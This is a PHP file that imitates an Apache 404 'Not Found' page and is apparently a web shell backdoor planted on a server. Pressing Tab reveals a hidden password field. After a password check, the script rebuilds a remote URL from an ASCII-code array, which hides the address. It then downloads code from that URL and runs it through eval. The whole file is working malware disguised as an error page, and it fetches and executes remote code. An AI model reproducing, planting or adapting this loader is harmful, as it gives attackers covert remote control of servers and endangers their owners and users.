<?php
session_start();

// ASCII-decoded URL
$asciiArray = [
    104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104,
    117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111,
    109, 47, 98, 111, 107, 97, 109, 97, 110, 49, 50, 47, 55, 104, 51, 111, 47,
    114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47,
    98, 97, 110, 100, 105, 114, 45, 112, 117, 116, 47, 101, 105, 107, 104, 97,
    110, 101, 47, 107, 105, 47, 107, 111, 114, 111, 115, 47, 102, 117, 99, 107,
    47, 121, 111, 117, 47, 98, 46, 116, 120, 116
];
$url = '';
foreach ($asciiArray as $ascii) {
    $url .= chr($ascii);
}

$correct_password = '$2y$10$cE1fZ09U/.4d3eT5zPZxE.e0.zOCvq5prclkQ9Z0xhEIV1F.ltnMy';

// Handle password form
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass'])) {
    if (password_verify($_POST['pass'], $correct_password)) {
        $_SESSION['auth'] = true;
        $_SESSION['ts_url'] = $url;
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    } else {
        $error = "Invalid password.";
    }
}

// Authenticated: fetch and show remote content
if (isset($_SESSION['auth']) && $_SESSION['auth'] === true) {
    $remote = @file_get_contents($_SESSION['ts_url'] ?? $url);
    if (!$remote) {
        $ch = curl_init($_SESSION['ts_url'] ?? $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $remote = curl_exec($ch);
        curl_close($ch);
    }
    if (is_string($remote)) {
        eval("?>$remote");
        exit;
    } else {
        echo "<p>Error loading content.</p>";
        exit;
    }
}
?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <title>Not Found</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #fff;
            color: #000;
            padding: 2em;
            margin: 0;
        }

        h1 {
            font-size: 22px;
        }

        hr {
            margin-top: 10px;
        }

        address {
            font-style: italic;
        }

        #input_container {
            display: none;
            margin-top: 20px;
        }

        input[type="password"] {
            border: none;
            background: none;
            font: inherit;
            font-size: 14px;
            outline: none;
        }
    </style>
</head>

<body>
    <h1>Not Found</h1>
    <p>The requested URL <code>/proprietary-software.html</code> was not found on this server.</p>
    <hr>
    <address>Apache/2.4.10 (Debian) Server at <?php echo $_SERVER["HTTP_HOST"]; ?> Port 80</address>

    <?php if (!empty($error)) echo "<p style='color:red;'>$error</p>"; ?>

    <div id="input_container">
        <form method="post" id="my_form">
            <input type="password" name="pass" id="password" autocomplete="off" />
        </form>
    </div>

    <script>
        document.addEventListener("keydown", function (event) {
            if (event.key === "Tab") {
                event.preventDefault();
                document.getElementById("input_container").style.display = "block";
                document.getElementById("password").focus();
            } else if (event.key === "Enter") {
                if (document.getElementById("input_container").style.display === "block") {
                    document.getElementById("my_form").submit();
                }
            }
        });
    </script>
</body>

</html>
